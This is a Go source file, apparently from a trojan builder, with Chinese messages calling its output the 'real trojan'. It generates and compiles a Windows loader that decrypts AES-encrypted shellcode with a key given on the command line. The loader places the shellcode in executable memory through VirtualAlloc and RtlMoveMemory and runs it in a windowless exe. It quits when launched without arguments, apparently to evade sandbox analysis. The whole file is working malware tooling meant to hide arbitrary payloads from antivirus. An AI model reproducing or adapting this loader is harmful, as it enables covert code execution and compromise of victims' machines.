package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

func toexe(s string, path string) {
	var execode string
	execode = `package main

	import (
		"crypto/aes"
		"crypto/cipher"
		"encoding/base64"
		"errors"
		"os"
		"syscall"
		"unsafe"
	)
	
	var (
		ke            = "kernel32.dll"
		vi            = "VirtualAlloc"
		rt            = "RtlMoveMemory"
		kernel32      = syscall.NewLazyDLL(ke)
		VirtualAlloc  = kernel32.NewProc(vi)
		RtlMoveMemory = kernel32.NewProc(rt)
	)
	func main() {
	
		if len(os.Args) == 1 {
			os.Exit(0)
		} else {
			a := os.Args[1]
			gorun(` + "\"" + s + "\"" + `, []byte(a))
		}
	}
	func gorun(shellCode string, key []byte) {
		bytes, _ := base64.StdEncoding.DecodeString(shellCode)
		decrypt, _ := Decrypt(key, bytes)
		shellcode, _ := base64.StdEncoding.DecodeString(string(decrypt))
	
		addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
		_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
		_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
	}
	func Decrypt(key []byte, text []byte) ([]byte, error) {
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, err
		}
		if (len(text) % aes.BlockSize) != 0 {
			return nil, errors.New("")
		}
		iv := text[:aes.BlockSize]
		decodedCipherMsg := text[aes.BlockSize:]
		cfbDecrypter := cipher.NewCFBDecrypter(block, iv)
		cfbDecrypter.XORKeyStream(decodedCipherMsg, decodedCipherMsg)
		length := len(decodedCipherMsg)
		paddingLen := int(decodedCipherMsg[length-1])
		result := decodedCipherMsg[:(length - paddingLen)]
		return result, nil
	}	
	`

	ok, err := os.OpenFile("exe.go", os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		fmt.Println("打开exe.go文件失败")
	}
	defer ok.Close()
	i, err1 := ok.Write([]byte(execode))
	if err1 != nil {
		fmt.Println("写入exe.go文件失败")
	} else {
		batfile, _ := os.OpenFile("build.bat", os.O_WRONLY|os.O_CREATE, 0600)
		_, _ = batfile.Write([]byte("go build -ldflags=\"-H windowsgui\" -o exe.exe exe.go"))
		batfile.Close()
		fmt.Println("写入大小:", i)
		fmt.Print("编译真实马-- ")
		build := exec.Command(filepath.Dir(path) + "\\build.bat")
		comerr := build.Run()
		if comerr != nil {
			fmt.Println(comerr)
		}
		fmt.Println("编译真实马完成")
	}
}
